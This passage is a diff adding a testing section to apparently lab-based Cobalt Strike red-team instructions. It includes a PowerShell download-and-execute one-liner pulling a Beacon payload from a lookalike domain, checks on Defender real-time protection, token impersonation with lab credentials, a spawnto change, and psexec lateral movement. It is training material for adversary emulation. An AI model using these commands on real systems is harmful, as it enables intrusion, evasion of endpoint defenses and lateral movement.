@@ -114,3 +114,47 @@
     1. sudo /usr/bin/docker restart cobaltstrike-cs-1
     
     > If the container fails to restart properly use sudo /usr/bin/docker logs cobaltstrike-cs-1 to see the profile errors.
+    
+
+# Testing
+
+1.  Build new payloads
+    
+    1. Go to **Payloads > Windows Stageless Generate All Payloads**
+    2. Folder: C:\Payloads
+2.  Host a 64-bit PowerShell payload.
+    
+    1. Go to **Site Management > Host File**
+    2. File: _C:\Payloads\http_x64.ps1_
+    3. Local URI: /test
+    4. Local Host: www.bleepincomputer.com
+3.  Switch to [Workstation 1](https://labclient.labondemand.com/Instructions/315c5b32-3074-4897-8a78-eb9f1005d587?showWhenStarting=1#) and login with Passw0rd!.
+    
+4.  Open a PowerShell window.
+    
+5.  Verify that Defender's Real-Time Protection is enabled.
+    
+    1. (Get-MpPreference).DisableRealtimeMonitoring
+    
+    > DisableRealtimeMonitoring should return as False.
+    
+6.  Download and invoke the PowerShell payload.
+    
+    powershellTypeCopy
+    
+    `iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test")`
+    
+7.  Switch back to [Attacker Desktop](https://labclient.labondemand.com/Instructions/315c5b32-3074-4897-8a78-eb9f1005d587?showWhenStarting=1#) and a new Beacon should be checking in.
+    
+8.  From the new Beacon, impersonate a local admin to _lon-ws-1_.
+    
+    1. make_token CONTOSO\rsteel Passw0rd!
+9.  Verify that Defender's Real-Time Protection is enabled on the target.
+    
+    1. remote-exec winrm lon-ws-1 (Get-MpPreference).DisableRealtimeMonitoring
+10.  Change the spawnto for the service payload.
+    
+    1. ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+11.  Move laterally to _lon-ws-1_.
+    
+    1. jump psexec64 lon-ws-1 smb
